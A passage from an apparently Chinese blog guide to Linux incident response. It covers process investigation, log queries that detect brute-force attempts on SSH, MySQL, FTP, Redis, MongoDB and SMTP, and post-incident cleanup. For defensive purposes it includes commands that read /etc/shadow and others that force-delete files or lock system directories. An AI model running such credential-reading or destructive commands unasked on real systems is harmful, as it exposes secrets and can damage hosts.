class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tcl">lsof -p <span class="hljs-keyword">pid</span><br>pwdx <span class="hljs-keyword">pid</span><br>systemctl status <span class="hljs-keyword">pid</span><br>cat /<span class="hljs-keyword">proc</span>/pid/maps<span class="hljs-title"></span><br><span class="hljs-title">ls</span> -al /<span class="hljs-keyword">proc</span>/pid/exe<br></code></pre></td></tr></table></figure><ul><li>根据 pid 查看对应线程</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> <span class="hljs-built_in">H</span> <span class="hljs-literal">-T</span> <span class="hljs-literal">-p</span> pid<br><span class="hljs-built_in">ps</span> <span class="hljs-literal">-aLf</span> pid<br>pstree <span class="hljs-literal">-agplU</span>（推荐使用）<br></code></pre></td></tr></table></figure><ul><li>确定进程运行时间</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> -eo pid,lstart,etime,cmd | <span class="hljs-keyword">grep</span> <span class="hljs-symbol">&lt;pid&gt;</span><br></code></pre></td></tr></table></figure><ul><li>比对恶意文件的创建时间</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stat</span> xxx.xx<br><span class="hljs-built_in">ls</span> -al xxx.xx<br></code></pre></td></tr></table></figure><ul><li>样本采集分析</li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">使用<span class="hljs-keyword">SCP/Xshell等将样本移出主机，计算哈希值后到威胁情报平台中去搜索</span><br><span class="hljs-keyword"></span>certutil -hashfile 文件 MD5<br></code></pre></td></tr></table></figure><ul><li>进程查杀</li></ul><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima">【查找子进程】<br>ps ajfx<br>systemctl <span class="hljs-built_in">status</span><br>【杀死进程】<br><span class="hljs-built_in">kill</span> -<span class="hljs-number">9</span> pid   （这样子是杀不死子进程的！！！）<br><span class="hljs-built_in">kill</span> -<span class="hljs-number">9</span> -pid   （杀掉进程组）<br></code></pre></td></tr></table></figure><ul><li>删除文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看文件占用，解除占用后删除</span><br>lsof xxxx.xx<br><span class="hljs-comment"># 移除 i, a 属性</span><br>chattr -ia file.sh<br><span class="hljs-comment"># 查看是否移除成功</span><br>lsattr file.sh<br><span class="hljs-comment"># 移除文件</span><br><span class="hljs-built_in">rm</span> -rf file.sh<br><span class="hljs-comment"># 奇怪文件名无法删除，先查inode再删除</span><br><span class="hljs-built_in">ls</span> -li xxxx.xx<br>find ./* -inum 12327526 -delete<br>find ./ -inum 12327526 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> &#123;&#125; \;<br>find ./* -inum 12327526 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -i &#123;&#125; \;<br>find ./* -inum 12327526 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -f &#123;&#125; \;<br>find ./* -inum 12327526 |xargs <span class="hljs-built_in">rm</span> -f<br><span class="hljs-built_in">rm</span> `find ./* -inum 12327526`<br><span class="hljs-comment"># 目录挂载无法删除（Device or resource busy）</span><br>sudo lsblk -a<br>sudo umount /dev/sdb1<br><span class="hljs-built_in">rm</span> -rf xxxx.xx<br></code></pre></td></tr></table></figure><ul><li>网页挖矿排查</li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 浏览器查看历史记录，定位到该事件点访问的页面</span><br><span class="hljs-meta"># 进入虚拟机进行访问，并限制进程只允许占用一个cpu</span><br><span class="hljs-meta"># 查看该网页的源码和网络链接调用</span><br><span class="hljs-meta"># 将浏览器缓存文件进行检测（大多数是JS）</span><br><span class="hljs-meta"># 清除浏览数据&gt;清除缓存文件</span><br><span class="hljs-meta"># 解密恶意文件查看矿池地址以及连接条件</span><br><span class="hljs-meta"># 上区块链网站溯源</span><br></code></pre></td></tr></table></figure><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><p>暴力破解一般针对</p><p>ssh、mysql、ftp、redis、mongodb、smtp</p><h2 id="SSH-暴力破解"><a href="#SSH-暴力破解" class="headerlink" title="SSH 暴力破解"></a><strong>SSH 暴力破解</strong></h2><ol><li>使用 <code>netstat -pantu</code> 查看网络状态，重点是 PID（当被破解时会有大量的 ESTABLISHED）</li><li>使用 <code>awk -F: &#39;&#123;if($3==0) print $1&#125;&#39; /etc/passwd</code> 查找特殊权限账号（默认 root）</li><li>查找可以使用 ssh 登录的账号</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">s=$( sudo <span class="hljs-built_in">cat</span> /etc/shadow | grep <span class="hljs-string">&#x27;^[^:]*:[^\*!]&#x27;</span> | awk -F: <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>);<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$s</span>;<span class="hljs-keyword">do</span> <span class="hljs-built_in">cat</span>/etc/passwd | grep -v <span class="hljs-string">&quot;/bin/false\|/nologin&quot;</span>| grep <span class="hljs-variable">$i</span>;<span class="hljs-keyword">done</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> |awk -F: <span class="hljs-string">&#x27;&#123;print$1&#125;&#x27;</span><br></code></pre></td></tr></table></figure><ol><li>查看正在连接的 ssh-session</li></ol><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">who -a<br>w<br><span class="hljs-keyword">last</span> -p now<br>sudo netstat -tnpa | <span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;ESTABLISHED.*sshd&#x27;</span><br>pgrep -af sshd<br>echo $SSH_CONNECTION<br>ss | <span class="hljs-keyword">grep</span> ssh<br></code></pre></td></tr></table></figure><ol><li>查看所有的账号信息</li></ol><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/auth.<span class="hljs-built_in">log</span>（Ubuntu）<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/secure（centOS）<br>列出当前账户         <br>who am i<br></code></pre></td></tr></table></figure><ol><li>查看登录日志</li></ol><blockquote><p>查看日志 cd &#x2F;var&#x2F;log<br>成功登录 cat &#x2F;var&#x2F;log&#x2F;auth.log | grep “Accept”<br>正常退出 cat &#x2F;var&#x2F;log&#x2F;auth.log | grep “pam_unix(sshd:session): session closed”<br>密码错误 cat &#x2F;var&#x2F;log&#x2F;auth.log | grep “authentication failure”<br>连续错误 cat &#x2F;var&#x2F;log&#x2F;auth.log | grep “message repeated 2 times”</p></blockquote><ol><li>统计数据</li></ol><blockquote><p>登录失败的用户名及其次数<br>grep “Failed password” &#x2F;var&#x2F;log&#x2F;auth.log|perl -e ‘while($_&#x3D;&lt;&gt;){ &#x2F;for(.*?)from&#x2F;; print”$1\n”;}’|sort|uniq -c|sort -nr</p><p>登录失败的 IP 及其次数<br>cat &#x2F;var&#x2F;log&#x2F;auth.log | grep “Failed password for” | grep “root” | grep -Po ‘(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)){3}’ |sort|uniq -c|sort -nr</p></blockquote><ol><li>加固防护<br>升级 SSH 版本至少为 7.7 版本以上，7.7 及以下版本存在 SSH 用户名枚举<br>加强口令复杂程度<br>禁止 root 用户登录，可以通过其他用户 su 到 root<br>安装 <code>fail2ban</code> 来进行防御</li></ol><h2 id="Mysql-暴力破解"><a href="#Mysql-暴力破解" class="headerlink" title="Mysql 暴力破解"></a><strong>Mysql 暴力破解</strong></h2><p>Mysql 默认安装会保留登录日志，在 Ubuntu 上默认位置为 <code>/var/og/mysql/error.log</code></p><ol><li>查看登录失败的用户名</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mysql/</span>error.log | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Access denied for user&quot;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;using password: YES&quot;</span> | awk -F <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr<br></code></pre></td></tr></table></figure><ol><li>查看登录失败的 IP 及次数</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mysql/</span>error.log | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Access denied for user&quot;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;using password: YES&quot;</span> | awk -F <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="hljs-keyword">sort</span>| uniq | <span class="hljs-keyword">while</span> <span class="hljs-keyword">read</span> line;<span class="hljs-keyword">do</span> echo $line;cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mysql/</span>error.log | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Access denied for user&quot;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;using password&quot;</span> | awk -F <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr; done<br></code></pre></td></tr></table></figure><h2 id="FTP-暴力破解"><a href="#FTP-暴力破解" class="headerlink" title="FTP 暴力破解"></a><strong>FTP 暴力破解</strong></h2><ol><li>查看网络连接（如果有爆破会有大量的 ESTABLISHED 状态和 TIME WAIT 状态的网络连接）</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -pantu</span><br></code></pre></td></tr></table></figure><ol><li>查看最近的一个 ftp 会话（也可以用 ftpwho 查找）</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">last</span> -w -t<br></code></pre></td></tr></table></figure><ol><li>查找日志</li></ol><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/vsftpd.<span class="hljs-keyword">log</span>   具体的位置可能不太一样，需要自己查找<br></code></pre></td></tr></table></figure><ol><li>查找登录失败的账号</li></ol><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">cat /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/vsftpd.<span class="hljs-built_in">log</span> | grep FAIL | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;[&quot;</span> -f <span class="hljs-number">3</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;]&quot;</span> -f <span class="hljs-number">1</span> | <span class="hljs-built_in">sort</span> | uniq -c | <span class="hljs-built_in">sort</span> -nr<br></code></pre></td></tr></table></figure><ol><li>查找登录失败的 IP</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/vsftpd.log | grep FAIL | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;[&quot;</span> -f 3 | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;]&quot;</span> -f 1 | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line;<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span>;<span class="hljs-built_in">cat</span> /var/log/vsftpd.log | grep <span class="hljs-variable">$line</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;:&quot;</span> -f 7 | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;&quot;&#x27;</span> -f 1 | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><ol><li>FTP 服务加固<br>禁用 anonymous 和 ftp 两个账号<br>使用 SSL 加密 FTP<br>安装 fail2ban 来进行防御</li></ol><h2 id="Redis-未授权暴力破解"><a href="#Redis-未授权暴力破解" class="headerlink" title="Redis 未授权暴力破解"></a><strong>Redis 未授权暴力破解</strong></h2><p>将 redis.conf 中的 requirepass 前的注释打开，并且设置一个复杂密码</p><p>缩减开放端口，建议仅在本机 127.0.0.1 使用</p><p>配置完成后需要重启来生效</p><ul><li>只有手动设置 logfile 才能保存日志，默认不设置默认的日志级别 notice 是不会记录登录、执行指令、退出的。</li><li>loglevel 设置为 verbose 或者 debug 才会记录登录主机</li><li>执行的指令 <code>info，set</code> 等即使 loglevel 是 debug 级别也不会记录，但是会记录我们设置了多少个 key， 具体 key 名称以及内容不会记录</li></ul><p><strong>虽然如此，但是失败成功的登录日志都是一样的……</strong><br><strong>没办法区分是不是攻击行为，只能问有没有人那个时候登过了</strong></p><h2 id="MongoDB-暴力破解"><a href="#MongoDB-暴力破解" class="headerlink" title="MongoDB 暴力破解"></a><strong>MongoDB 暴力破解</strong></h2><p>默认配置文件位置为 &#x2F;etc&#x2F;mongodb.conf</p><p>默认的的日志位置为 &#x2F;var&#x2F;og&#x2F;mongodb&#x2F;mongodb.log</p><p>打开 verbose 后能看到大量的 failed 事件</p><p>在&#x2F;var&#x2F;log&#x2F;mongodb&#x2F;mongodb.log 查看</p><ol><li>登录失败的账户</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mongodb/m</span>ongodb.log | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;UserNotFound&quot;</span>|<span class="hljs-keyword">grep</span> failed | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $9&#125;&#x27;</span> | <span class="hljs-keyword">sort</span>|uniq -c|<span class="hljs-keyword">sort</span> -nr<br></code></pre></td></tr></table></figure><ol><li>登录所有账户失败的 IP 及次数</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mongodb/m</span>ongodb.log | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;UserNotFound&quot;</span>|<span class="hljs-keyword">grep</span> failed | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $9&#125;&#x27;</span> |<span class="hljs-keyword">sort</span> | uniq | <span class="hljs-keyword">while</span> <span class="hljs-keyword">read</span> line;<span class="hljs-keyword">do</span> echo $line;cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mongodb/m</span>ongodb.log |<span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;UserNotFound&quot;</span> | <span class="hljs-keyword">grep</span> failed | <span class="hljs-keyword">grep</span> $line | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $14&#125;&#x27;</span> | cut -d <span class="hljs-string">&quot;:&quot;</span> -f <span class="hljs-number">1</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr; done<br></code></pre></td></tr></table></figure><ol><li>不存在账户的爆破事件</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mongodb/m</span>ongodb.log | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;UserNotFound&quot;</span>|<span class="hljs-keyword">grep</span> failed | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $9&#125;&#x27;</span> |<span class="hljs-keyword">sort</span> | uniq | <span class="hljs-keyword">while</span> <span class="hljs-keyword">read</span> line;<span class="hljs-keyword">do</span> echo $line;cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mongodb/m</span>ongodb.log |<span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;UserNotFound&quot;</span> | <span class="hljs-keyword">grep</span> failed | <span class="hljs-keyword">grep</span> $line | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $14&#125;&#x27;</span> | cut -d <span class="hljs-string">&quot;:&quot;</span> -f <span class="hljs-number">1</span> | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr; done<br></code></pre></td></tr></table></figure><h2 id="SMTP-暴力破解"><a href="#SMTP-暴力破解" class="headerlink" title="SMTP 暴力破解"></a><strong>SMTP 暴力破解</strong></h2><p>SMTP 负责发，POP3、IMAP 负责收，POP3 协议客户端收到邮件，服务器端就会将其删除，除非有特殊的配置。</p><p>IMAP 则弥补了这一缺陷，客户端该收收，服务端还给你保存着，同时你在客户端的各种配置操作都会在服务器上进行同步</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">验证失败的账户IP<br><span class="hljs-keyword">cat</span> /var/<span class="hljs-built_in">log</span>/mail.<span class="hljs-built_in">log</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;authentication failed&quot;</span> | <span class="hljs-keyword">grep</span> -Po <span class="hljs-string">&#x27;(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|</span><br></code></pre></td></tr></table></figure><h1 id="善后处理"><a href="#善后处理" class="headerlink" title="善后处理"></a>善后处理</h1><h2 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a><strong>杀死进程</strong></h2><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mel">top d1   <span class="hljs-comment">//运行top命令后，键入大写字母P按cpu排序</span><br>ps aux | <span class="hljs-keyword">sort</span> -k4nr   <span class="hljs-comment">//运行top命令后，键入大写字母M按内存排序</span><br><span class="hljs-keyword">ls</span> -la /<span class="hljs-keyword">proc</span>/$pid/exe   <span class="hljs-comment">//查找进程文件</span><br>strace -tt  -T -e  <span class="hljs-keyword">trace</span>=all  -p $pid   <span class="hljs-comment">//跟踪进程运行</span><br>lsof -p $pid   <span class="hljs-comment">//进程打开的文件</span><br>netstat -anltp | grep $pid   <span class="hljs-comment">//查看进程端口情况</span><br></code></pre></td></tr></table></figure><h2 id="查看账号"><a href="#查看账号" class="headerlink" title="查看账号"></a><strong>查看账号</strong></h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stata">awk -F <span class="hljs-string">&quot;:&quot;</span> &#x27;<br><span class="hljs-variable">$3</span>==0&#123;<span class="hljs-keyword">print</span> $<br>1&#125;&#x27; /etc/passwd   <span class="hljs-comment">//查看特权用户</span><br>awk &#x27;/\<br><span class="hljs-variable">$1</span>|\$<br>6/&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$1&#125;</span>&#x27; /etc/shadow   <span class="hljs-comment">//可远程登录的账号信息</span><br><span class="hljs-keyword">cat</span> /etc/sudoers | grep -v <span class="hljs-string">&quot;^#\|^$&quot;</span> | grep <span class="hljs-string">&quot;ALL=(ALL)&quot;</span>   <span class="hljs-comment">//sudo的账号</span><br>w   <span class="hljs-comment">//当前用户及其行为</span><br>lastlog   <span class="hljs-comment">//所有用户最后登录时间</span><br>last   <span class="hljs-comment">//所有用户关键信息</span><br>grep <span class="hljs-string">&quot;Accepted &quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | awk &#x27;&#123;<span class="hljs-keyword">print</span> <br><span class="hljs-variable">$1</span>,$<br>2,<br><span class="hljs-variable">$3</span>,$<br>9,<span class="hljs-variable">$11&#125;</span>&#x27;   <span class="hljs-comment">//成功登录日期、用户名及ip</span><br><span class="hljs-comment">//查看试图爆破主机的ip</span><br>grep refused /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | awk &#123;&#x27;<span class="hljs-keyword">print</span> <span class="hljs-variable">$9</span>&#x27;&#125; | <span class="hljs-keyword">sort</span> | uniq -c |<span class="hljs-keyword">sort</span> -nr | <span class="hljs-keyword">more</span><br>grep <span class="hljs-string">&quot;Failed password&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure* | grep -<span class="hljs-keyword">E</span> -o <span class="hljs-string">&quot;(([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;))&quot;</span> | uniq -c <br>grep <span class="hljs-string">&quot;Failed password for root&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure | awk &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$11&#125;</span>&#x27; | <span class="hljs-keyword">sort</span>   <span class="hljs-comment">//查看爆破root的ip</span><br>grep <span class="hljs-string">&quot;Failed password&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure | awk &#123;&#x27;<span class="hljs-keyword">print</span> <span class="hljs-variable">$9</span>&#x27;&#125; | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr   <span class="hljs-comment">//查看爆破的用户名字典</span><br></code></pre></td></tr></table></figure><h2 id="锁定目录"><a href="#锁定目录" class="headerlink" title="锁定目录"></a><strong>锁定目录</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 000 /usr/bin/风险目录<br>chattr +i /usr/bin<br>chattr +i /bin<br>chattr +i /tmp<br></code></pre></td></tr></table></figure><h2 id="检查异常文件"><a href="#检查异常文件" class="headerlink" title="检查异常文件"></a><strong>检查异常文件</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">【检查特权文件】<br>find <span class="hljs-regexp">/ -perm /</span><span class="hljs-number">6000</span><br>find <span class="hljs-regexp">/ -perm /</span><span class="hljs-number">4000</span><br>find <span class="hljs-regexp">/ -perm /</span><span class="hljs-number">2000</span><br>【检查corn文件】<br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>*<br><span class="hljs-regexp">/etc/</span>crontab <br><span class="hljs-regexp">/etc/</span>cron.d/* <br><span class="hljs-regexp">/etc/</span>cron.daily/*<br><span class="hljs-regexp">/etc/</span>cron.hourly/* <br><span class="hljs-regexp">/etc/</span>cron.monthly/* <br><span class="hljs-regexp">/etc/</span>cron.weekly/ <br><span class="hljs-regexp">/etc/</span>anacrontab     <br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/anacron/</span>*<br>【最近被修改的系统文件】<br>find <span class="hljs-regexp">/etc/</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/ /u</span>sr<span class="hljs-regexp">/sbin/</span> <span class="hljs-regexp">/bin/</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>  -type f -mtime -T | xargs ls -la<br>【被替换的命令/动态链接库劫持】<br>echo <span class="hljs-variable">$LD_PRELOAD</span><br>echo <span class="hljs-variable">$LD_LIBRARY_PATH</span><br>注：基本上上面两个命令回显是空白的，如果有回显大概率是被劫持<br>ls -alt <span class="hljs-regexp">/usr/</span>bin <span class="hljs-regexp">/usr/</span>sbin <span class="hljs-regexp">/bin /u</span>sr<span class="hljs-regexp">/local/</span>bin<br>rpm -Va&gt;rpm.log<br></code></pre></td></tr></table></figure><h2 id="删除计划任务等"><a href="#删除计划任务等" class="headerlink" title="删除计划任务等"></a><strong>删除计划任务等</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm -f <span class="hljs-regexp">/etc/i</span>nit.d/风险目录<br>rm -f <span class="hljs-regexp">/etc/</span>rc<span class="hljs-comment">#.d/木马连接文件</span><br>cat <span class="hljs-regexp">/etc/</span>rc.local   <span class="hljs-regexp">//</span>开机启动项<br>chkconfig --list   <span class="hljs-regexp">//</span>开机启动项<br>注意：建议使用vim查看，cat有可能显示不全<br></code></pre></td></tr></table></figure><h2 id="rootkit-查杀"><a href="#rootkit-查杀" class="headerlink" title="rootkit 查杀"></a><strong>rootkit 查杀</strong></h2><p>rootkit 主要有两种类型：文件级别和内核级别。<br>文件级别的 rootkit: 一般是通过程序漏洞或者系统漏洞进入系统后，通过修改系统的重要文件来达到隐藏自己的目的。<br>内核级 rootkit: 是比文件级 rootkit 更高级的一种入侵方式，它可以使攻击者获得对系统底层的完全控制权，此时攻击者可以修改系统内核，进而截获运行程序向内核提交的命令，并将其重定向到入侵者所选择的程序并运行此程序。内核级 rootkit 主要依附在内核上，它并不对系统文件做任何修改。以防范为主。<br><strong>查杀工具：</strong><br><a href="http://www.chkrootkit.org/">chkrootkit </a>、<a href="http://rkhunter.sourceforge.net/"> rkhunter </a>、<a href="http://www.clamav.net/download.html"> ClamAV</a></p><h2 id="其它检查方面"><a href="#其它检查方面" class="headerlink" title="其它检查方面"></a><strong>其它检查方面</strong></h2><ul><li>BASH 内置命令</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">compgen -<span class="hljs-selector-tag">b</span><br></code></pre></td></tr></table></figure><ul><li>BASH 函数</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">compgen <span class="hljs-operator">-f</span><br>unset <span class="hljs-operator">-f</span> functionName<br></code></pre></td></tr></table></figure><ul><li>环境变量</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span><br><span class="hljs-built_in">set</span><br><span class="hljs-built_in">export</span><br><span class="hljs-built_in">cat</span> /proc/<span 